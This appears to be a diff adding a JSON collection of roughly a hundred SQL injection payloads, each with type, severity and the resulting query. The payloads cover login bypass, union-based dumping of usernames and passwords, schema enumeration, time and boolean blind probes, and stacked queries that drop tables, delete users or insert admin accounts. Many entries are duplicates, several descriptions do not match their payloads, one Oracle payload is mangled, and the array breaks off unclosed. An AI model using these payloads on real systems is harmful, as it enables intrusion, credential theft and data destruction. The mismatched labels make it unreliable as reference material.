@@ -1,0 +1,3848 @@
+[
+  {
+    "id": "sqli-001",
+    "description": "Basic tautology-based SQL injection",
+    "payload": "' OR '1'='1",
+    "context": "Login form username input",
+    "type": "tautology",
+    "severity": "high",
+    "example_query": "SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''"
+  },
+  {
+    "id": "sqli-002",
+    "description": "Union-based SQL injection to extract data",
+    "payload": "' UNION SELECT username, password FROM users--",
+    "context": "Search input field",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT username, password FROM users--"
+  },
+  {
+    "id": "sqli-003",
+    "description": "Blind SQL injection with time delay",
+    "payload": "'; WAITFOR DELAY '0:0:5'--",
+    "context": "ID parameter in URL",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = ''; WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "id": "sqli-004",
+    "description": "Error-based SQL injection to reveal database version",
+    "payload": "' AND 1=CONVERT(int,@@version)--",
+    "context": "User ID input",
+    "type": "error-based",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE id = '' AND 1=CONVERT(int,@@version)--"
+  },
+  {
+    "id": "sqli-005",
+    "description": "Boolean-based blind SQL injection",
+    "payload": "' AND 1=1--",
+    "context": "Search field",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' AND 1=1--"
+  },
+  {
+    "id": "sqli-006",
+    "description": "Stacked queries to execute multiple statements",
+    "payload": "'; DROP TABLE users--",
+    "context": "User input in form",
+    "type": "stacked-queries",
+    "severity": "critical",
+    "example_query": "SELECT * FROM users WHERE username = ''; DROP TABLE users--"
+  },
+  {
+    "id": "sqli-007",
+    "description": "Using comment to truncate query",
+    "payload": "' OR 1=1--",
+    "context": "Login password field",
+    "type": "tautology",
+    "severity": "high",
+    "example_query": "SELECT * FROM users WHERE password = '' OR 1=1--"
+  },
+  {
+    "id": "sqli-008",
+    "description": "Hex encoded payload",
+    "payload": "0x27 OR 0x31=0x31--",
+    "context": "URL parameter",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE id = 0x27 OR 0x31=0x31--"
+  },
+  {
+    "id": "sqli-009",
+    "description": "Using sleep for blind time-based injection",
+    "payload": "'; SELECT pg_sleep(5)--",
+    "context": "PostgreSQL ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = ''; SELECT pg_sleep(5)--"
+  },
+  {
+    "id": "sqli-010",
+    "description": "Extracting database user with error-based injection",
+    "payload": "' AND 1=CONVERT(int,USER())--",
+    "context": "User input",
+    "type": "error-based",
+    "severity": "medium",
+    "example_query": "SELECT * FROM accounts WHERE user = '' AND 1=CONVERT(int,USER())--"
+  },
+  {
+    "id": "sqli-011",
+    "description": "Blind boolean-based injection with AND condition",
+    "payload": "' AND SUBSTRING(@@version,1,1)='5'--",
+    "context": "Search input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' AND SUBSTRING(@@version,1,1)='5'--"
+  },
+  {
+    "id": "sqli-012",
+    "description": "Using OR with false condition to bypass filters",
+    "payload": "' OR 'a'='a",
+    "context": "Login username",
+    "type": "tautology",
+    "severity": "high",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 'a'='a' AND password = ''"
+  },
+  {
+    "id": "sqli-013",
+    "description": "Using double dash comment to truncate query",
+    "payload": "' OR 1=1-- -",
+    "context": "Search field",
+    "type": "tautology",
+    "severity": "high",
+    "example_query": "SELECT * FROM items WHERE name = '' OR 1=1-- -"
+  },
+  {
+    "id": "sqli-014",
+    "description": "Using inline comment to bypass filters",
+    "payload": "'//OR//1=1--",
+    "context": "Login form",
+    "type": "tautology",
+    "severity": "high",
+    "example_query": "SELECT * FROM users WHERE username = ''//OR//1=1--"
+  },
+  {
+    "id": "sqli-015",
+    "description": "Using cast to bypass filters",
+    "payload": "' OR CAST('a' AS INT)=CAST('a' AS INT)--",
+    "context": "User input",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR CAST('a' AS INT)=CAST('a' AS INT)--"
+  },
+  {
+    "id": "sqli-016",
+    "description": "Using sleep in MySQL for time-based blind injection",
+    "payload": "' OR SLEEP(5)--",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = '' OR SLEEP(5)--"
+  },
+  {
+    "id": "sqli-017",
+    "description": "Using extractvalue for error-based injection",
+    "payload": "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",
+    "context": "User input",
+    "type": "error-based",
+    "severity": "high",
+    "example_query": "SELECT * FROM users WHERE id = '' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--"
+  },
+  {
+    "id": "sqli-018",
+    "description": "Using updatexml for error-based injection",
+    "payload": "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",
+    "context": "User input",
+    "type": "error-based",
+    "severity": "high",
+    "example_query": "SELECT * FROM users WHERE id = '' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--"
+  },
+  {
+    "id": "sqli-019",
+    "description": "Using sleep in PostgreSQL for time-based injection",
+    "payload": "'; SELECT pg_sleep(10)--",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = ''; SELECT pg_sleep(10)--"
+  },
+  {
+    "id": "sqli-021",
+    "description": "Using OR with sleep for time delay in MySQL",
+    "payload": "' OR SLEEP(10)--",
+    "context": "Search input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SLEEP(10)--"
+  },
+  {
+    "id": "sqli-022",
+    "description": "Using UNION SELECT with NULLs to bypass column count",
+    "payload": "' UNION SELECT NULL, NULL, username, password FROM users--",
+    "context": "Search field",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT id, name, description FROM products WHERE name = '' UNION SELECT NULL, NULL, username, password FROM users--"
+  },
+  {
+    "id": "sqli-023",
+    "description": "Using OR with false condition and inline comment",
+    "payload": "' OR 1=1/*",
+    "context": "Login username",
+    "type": "tautology",
+    "severity": "high",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 1=1/*"
+  },
+  {
+    "id": "sqli-024",
+    "description": "Using AND with subquery for blind boolean injection",
+    "payload": "' AND (SELECT COUNT(*) FROM users) > 0--",
+    "context": "Search input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' AND (SELECT COUNT(*) FROM users) > 0--"
+  },
+  {
+    "id": "sqli-025",
+    "description": "Using OR with sleep for time delay in PostgreSQL",
+    "payload": "' OR pg_sleep(7)--",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = '' OR pg_sleep(7)--"
+  },
+  {
+    "id": "sqli-026",
+    "description": "Using UNION SELECT with database() function",
+    "payload": "' UNION SELECT database(), NULL--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT database(), NULL--"
+  },
+  {
+    "id": "sqli-027",
+    "description": "Using OR with sleep for time delay in SQL Server",
+    "payload": "'; WAITFOR DELAY '0:0:10'--",
+    "context": "User ID input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:10'--"
+  },
+  {
+    "id": "sqli-028",
+    "description": "Using OR with cast to bypass filters",
+    "payload": "' OR CAST(1 AS INT)=1--",
+    "context": "Login form",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR CAST(1 AS INT)=1--"
+  },
+  {
+    "id": "sqli-029",
+    "description": "Using OR with substring for blind boolean injection",
+    "payload": "' OR SUBSTRING(user(),1,1)='r'--",
+    "context": "Search input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SUBSTRING(user(),1,1)='r'--"
+  },
+  {
+    "id": "sqli-030",
+    "description": "Using OR with sleep for time delay in Oracle",
+    "payload": "' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--",
+    "context": "User input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--"
+  },
+  {
+    "id": "sqli-031",
+    "description": "Using UNION SELECT with information_schema.tables",
+    "payload": "' UNION SELECT table_name, NULL FROM information_schema.tables--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT table_name, NULL FROM information_schema.tables--"
+  },
+  {
+    "id": "sqli-032",
+    "description": "Using OR with sleep for time delay in SQLite",
+    "payload": "' OR (SELECT sleep(5))--",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = '' OR (SELECT sleep(5))--"
+  },
+  {
+    "id": "sqli-033",
+    "description": "Using OR with hex encoded string",
+    "payload": "' OR 0x61646d696e=0x61646d696e--",
+    "context": "Login username",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 0x61646d696e=0x61646d696e--"
+  },
+  {
+    "id": "sqli-034",
+    "description": "Using OR with sleep for time delay in MySQL with comment",
+    "payload": "' OR SLEEP(5)#",
+    "context": "Search input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SLEEP(5)#"
+  },
+  {
+    "id": "sqli-035",
+    "description": "Using UNION SELECT with user() function",
+    "payload": "' UNION SELECT user(), NULL--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--"
+  },
+  {
+    "id": "sqli-036",
+    "description": "Using OR with sleep for time delay in PostgreSQL with comment",
+    "payload": "' OR pg_sleep(3)--",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = '' OR pg_sleep(3)--"
+  },
+  {
+    "id": "sqli-037",
+    "description": "Using OR with sleep for time delay in SQL Server with comment",
+    "payload": "'; WAITFOR DELAY '0:0:3'--",
+    "context": "User ID input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:3'--"
+  },
+  {
+    "id": "sqli-038",
+    "description": "Using OR with substring for blind boolean injection with comment",
+    "payload": "' OR SUBSTRING(@@version,1,1)='5'--",
+    "context": "Search input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='5'--"
+  },
+  {
+    "id": "sqli-039",
+    "description": "Using OR with sleep for time delay in Oracle with comment",
+    "payload": "' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--",
+    "context": "User input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--"
+  },
+  {
+    "id": "sqli-041",
+    "description": "Using OR with sleep for time delay in MySQL with inline comment",
+    "payload": "' OR SLEEP(8)/*",
+    "context": "Search input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SLEEP(8)/*"
+  },
+  {
+    "id": "sqli-042",
+    "description": "Using UNION SELECT to extract table names",
+    "payload": "' UNION SELECT table_name, NULL FROM information_schema.tables--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT table_name, NULL FROM information_schema.tables--"
+  },
+  {
+    "id": "sqli-043",
+    "description": "Using OR with substring for blind boolean injection with inline comment",
+    "payload": "' OR SUBSTRING(user(),1,1)='a'/*",
+    "context": "Login input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR SUBSTRING(user(),1,1)='a'/*"
+  },
+  {
+    "id": "sqli-044",
+    "description": "Using stacked queries to update data",
+    "payload": "'; UPDATE users SET password='hacked' WHERE username='admin'--",
+    "context": "User input",
+    "type": "stacked-queries",
+    "severity": "critical",
+    "example_query": "SELECT * FROM users WHERE username = ''; UPDATE users SET password='hacked' WHERE username='admin'--"
+  },
+  {
+    "id": "sqli-045",
+    "description": "Using OR with sleep for time delay in PostgreSQL with inline comment",
+    "payload": "' OR pg_sleep(6)/*",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = '' OR pg_sleep(6)/*"
+  },
+  {
+    "id": "sqli-046",
+    "description": "Using UNION SELECT to extract column names",
+    "payload": "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--"
+  },
+  {
+    "id": "sqli-047",
+    "description": "Using OR with cast for tautology",
+    "payload": "' OR CAST('1' AS INT)=1--",
+    "context": "Login form",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR CAST('1' AS INT)=1--"
+  },
+  {
+    "id": "sqli-048",
+    "description": "Using OR with sleep for time delay in SQL Server with inline comment",
+    "payload": "'; WAITFOR DELAY '0:0:7'/*",
+    "context": "User ID input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:7'/*"
+  },
+  {
+    "id": "sqli-049",
+    "description": "Using OR with substring for blind boolean injection with hash comment",
+    "payload": "' OR SUBSTRING(@@version,1,1)='8'#",
+    "context": "Search input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='8'#"
+  },
+  {
+    "id": "sqli-050",
+    "description": "Using UNION SELECT to extract user()",
+    "payload": "' UNION SELECT user(), NULL--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--"
+  },
+  {
+    "id": "sqli-051",
+    "description": "Using OR with sleep for time delay in Oracle with inline comment",
+    "payload": "' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/",
+    "context": "User input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/"
+  },
+  {
+    "id": "sqli-052",
+    "description": "Using stacked queries to delete data",
+    "payload": "'; DELETE FROM users WHERE username='guest'--",
+    "context": "User input",
+    "type": "stacked-queries",
+    "severity": "critical",
+    "example_query": "SELECT * FROM users WHERE username = ''; DELETE FROM users WHERE username='guest'--"
+  },
+  {
+    "id": "sqli-053",
+    "description": "Using OR with hex encoded tautology",
+    "payload": "' OR 0x31=0x31--",
+    "context": "Login username",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 0x31=0x31--"
+  },
+  {
+    "id": "sqli-054",
+    "description": "Using OR with sleep for time delay in MySQL with hash comment",
+    "payload": "' OR SLEEP(9)#",
+    "context": "Search input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SLEEP(9)#"
+  },
+  {
+    "id": "sqli-055",
+    "description": "Using UNION SELECT to extract schema names",
+    "payload": "' UNION SELECT schema_name, NULL FROM information_schema.schemata--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT schema_name, NULL FROM information_schema.schemata--"
+  },
+  {
+    "id": "sqli-056",
+    "description": "Using OR with sleep for time delay in PostgreSQL with hash comment",
+    "payload": "' OR pg_sleep(4)#",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = '' OR pg_sleep(4)#"
+  },
+  {
+    "id": "sqli-057",
+    "description": "Using OR with cast for tautology with inline comment",
+    "payload": "' OR CAST(1 AS INT)=1/*",
+    "context": "Login form",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR CAST(1 AS INT)=1/*"
+  },
+  {
+    "id": "sqli-058",
+    "description": "Using OR with substring for blind boolean injection with inline comment",
+    "payload": "' OR SUBSTRING(user(),1,1)='b'/*",
+    "context": "Search input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SUBSTRING(user(),1,1)='b'/*"
+  },
+  {
+    "id": "sqli-059",
+    "description": "Using UNION SELECT to extract current database",
+    "payload": "' UNION SELECT database(), NULL--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT database(), NULL--"
+  },
+  {
+    "id": "sqli-060",
+    "description": "Using stacked queries to create new user",
+    "payload": "'; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--",
+    "context": "User input",
+    "type": "stacked-queries",
+    "severity": "critical",
+    "example_query": "SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--"
+  },
+  {
+    "id": "sqli-061",
+    "description": "Using OR with sleep for time delay in SQL Server with hash comment",
+    "payload": "'; WAITFOR DELAY '0:0:5'#",
+    "context": "User ID input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:5'#"
+  },
+  {
+    "id": "sqli-062",
+    "description": "Using OR with substring for blind boolean injection with hash comment",
+    "payload": "' OR SUBSTRING(@@version,1,1)='9'#",
+    "context": "Search input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='9'#"
+  },
+  {
+    "id": "sqli-063",
+    "description": "Using UNION SELECT to extract user privileges",
+    "payload": "' UNION SELECT user(), NULL--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--"
+  },
+  {
+    "id": "sqli-064",
+    "description": "Using OR with sleep for time delay in Oracle with hash comment",
+    "payload": "' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#",
+    "context": "User input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#"
+  },
+  {
+    "id": "sqli-065",
+    "description": "Using stacked queries to drop table",
+    "payload": "'; DROP TABLE sessions--",
+    "context": "User input",
+    "type": "stacked-queries",
+    "severity": "critical",
+    "example_query": "SELECT * FROM users WHERE username = ''; DROP TABLE sessions--"
+  },
+  {
+    "id": "sqli-066",
+    "description": "Using OR with hex encoded tautology with comment",
+    "payload": "' OR 0x41=0x41--",
+    "context": "Login username",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 0x41=0x41--"
+  },
+  {
+    "id": "sqli-067",
+    "description": "Using OR with sleep for time delay in MySQL with double dash comment",
+    "payload": "' OR SLEEP(11)--",
+    "context": "Search input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SLEEP(11)--"
+  },
+  {
+    "id": "sqli-068",
+    "description": "Using UNION SELECT to extract schema names with comment",
+    "payload": "' UNION SELECT schema_name, NULL FROM information_schema.schemata--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT schema_name, NULL FROM information_schema.schemata--"
+  },
+  {
+    "id": "sqli-069",
+    "description": "Using OR with sleep for time delay in PostgreSQL with double dash comment",
+    "payload": "' OR pg_sleep(12)--",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = '' OR pg_sleep(12)--"
+  },
+  {
+    "id": "sqli-071",
+    "description": "Using OR with sleep for time delay in MySQL with double dash comment",
+    "payload": "' OR SLEEP(12)--",
+    "context": "Search input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SLEEP(12)--"
+  },
+  {
+    "id": "sqli-072",
+    "description": "Using UNION SELECT to extract column names with comment",
+    "payload": "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--"
+  },
+  {
+    "id": "sqli-073",
+    "description": "Using OR with substring for blind boolean injection with double dash comment",
+    "payload": "' OR SUBSTRING(user(),1,1)='c'--",
+    "context": "Login input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR SUBSTRING(user(),1,1)='c'--"
+  },
+  {
+    "id": "sqli-074",
+    "description": "Using stacked queries to insert admin user",
+    "payload": "'; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--",
+    "context": "User input",
+    "type": "stacked-queries",
+    "severity": "critical",
+    "example_query": "SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--"
+  },
+  {
+    "id": "sqli-075",
+    "description": "Using OR with sleep for time delay in PostgreSQL with double dash comment",
+    "payload": "' OR pg_sleep(8)--",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = '' OR pg_sleep(8)--"
+  },
+  {
+    "id": "sqli-076",
+    "description": "Using UNION SELECT to extract database version",
+    "payload": "' UNION SELECT @@version, NULL--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT @@version, NULL--"
+  },
+  {
+    "id": "sqli-077",
+    "description": "Using OR with cast for tautology with double dash comment",
+    "payload": "' OR CAST('1' AS INT)=1--",
+    "context": "Login form",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR CAST('1' AS INT)=1--"
+  },
+  {
+    "id": "sqli-078",
+    "description": "Using OR with sleep for time delay in SQL Server with double dash comment",
+    "payload": "'; WAITFOR DELAY '0:0:8'--",
+    "context": "User ID input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:8'--"
+  },
+  {
+    "id": "sqli-079",
+    "description": "Using OR with substring for blind boolean injection with double dash comment",
+    "payload": "' OR SUBSTRING(@@version,1,1)='7'--",
+    "context": "Search input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='7'--"
+  },
+  {
+    "id": "sqli-080",
+    "description": "Using UNION SELECT to extract current user",
+    "payload": "' UNION SELECT user(), NULL--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--"
+  },
+  {
+    "id": "sqli-081",
+    "description": "Using OR with sleep for time delay in Oracle with double dash comment",
+    "payload": "' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--",
+    "context": "User input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--"
+  },
+  {
+    "id": "sqli-082",
+    "description": "Using stacked queries to delete admin user",
+    "payload": "'; DELETE FROM users WHERE username='admin'--",
+    "context": "User input",
+    "type": "stacked-queries",
+    "severity": "critical",
+    "example_query": "SELECT * FROM users WHERE username = ''; DELETE FROM users WHERE username='admin'--"
+  },
+  {
+    "id": "sqli-083",
+    "description": "Using OR with hex encoded tautology with double dash comment",
+    "payload": "' OR 0x42=0x42--",
+    "context": "Login username",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 0x42=0x42--"
+  },
+  {
+    "id": "sqli-084",
+    "description": "Using OR with sleep for time delay in MySQL with double dash comment",
+    "payload": "' OR SLEEP(13)--",
+    "context": "Search input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SLEEP(13)--"
+  },
+  {
+    "id": "sqli-085",
+    "description": "Using UNION SELECT to extract schema names with double dash comment",
+    "payload": "' UNION SELECT schema_name, NULL FROM information_schema.schemata--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT schema_name, NULL FROM information_schema.schemata--"
+  },
+  {
+    "id": "sqli-086",
+    "description": "Using OR with sleep for time delay in PostgreSQL with double dash comment",
+    "payload": "' OR pg_sleep(14)--",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = '' OR pg_sleep(14)--"
+  },
+  {
+    "id": "sqli-087",
+    "description": "Using OR with cast for tautology with double dash comment",
+    "payload": "' OR CAST(1 AS INT)=1--",
+    "context": "Login form",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR CAST(1 AS INT)=1--"
+  },
+  {
+    "id": "sqli-088",
+    "description": "Using OR with substring for blind boolean injection with double dash comment",
+    "payload": "' OR SUBSTRING(user(),1,1)='d'--",
+    "context": "Search input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SUBSTRING(user(),1,1)='d'--"
+  },
+  {
+    "id": "sqli-089",
+    "description": "Using UNION SELECT to extract current database with double dash comment",
+    "payload": "' UNION SELECT database(), NULL--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT database(), NULL--"
+  },
+  {
+    "id": "sqli-090",
+    "description": "Using stacked queries to create new admin user",
+    "payload": "'; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--",
+    "context": "User input",
+    "type": "stacked-queries",
+    "severity": "critical",
+    "example_query": "SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--"
+  },
+  {
+    "id": "sqli-091",
+    "description": "Using OR with sleepfor time delay in SQL Server with double dash comment",
+    "payload": "'; WAITFOR DELAY '0:0:9'--",
+    "context": "User ID input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:9'--"
+  },
+  {
+    "id": "sqli-092",
+    "description": "Using OR with substring for blind boolean injection with double dash comment",
+    "payload": "' OR SUBSTRING(@@version,1,1)='6'--",
+    "context": "Search input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='6'--"
+  },
+  {
+    "id": "sqli-093",
+    "description": "Using UNION SELECT to extract user privileges with double dash comment",
+    "payload": "' UNION SELECT user(), NULL--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--"
+  },
+  {
+    "id": "sqli-094",
+    "description": "Using OR with sleep for time delay in Oracle with double dash comment",
+    "payload": "' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--",
+    "context": "User input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--"
+  },
+  {
+    "id": "sqli-095",
+    "description": "Using stacked queries to drop sessions table",
+    "payload": "'; DROP TABLE sessions--",
+    "context": "User input",
+    "type": "stacked-queries",
+    "severity": "critical",
+    "example_query": "SELECT * FROM users WHERE username = ''; DROP TABLE sessions--"
+  },
+  {
+    "id": "sqli-096",
+    "description": "Using OR with hex encoded tautology with double dash comment",
+    "payload": "' OR 0x43=0x43--",
+    "context": "Login username",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 0x43=0x43--"
+  },
+  {
+    "id": "sqli-097",
+    "description": "Using OR with sleep for time delay in MySQL with double dash comment",
+    "payload": "' OR SLEEP(14)--",
+    "context": "Search input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SLEEP(14)--"
+  },
+  {
+    "id": "sqli-098",
+    "description": "Using UNION SELECT to extract schema names with double dash comment",
+    "payload": "' UNION SELECT schema_name, NULL FROM information_schema.schemata--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT schema_name, NULL FROM information_schema.schemata--"
+  },
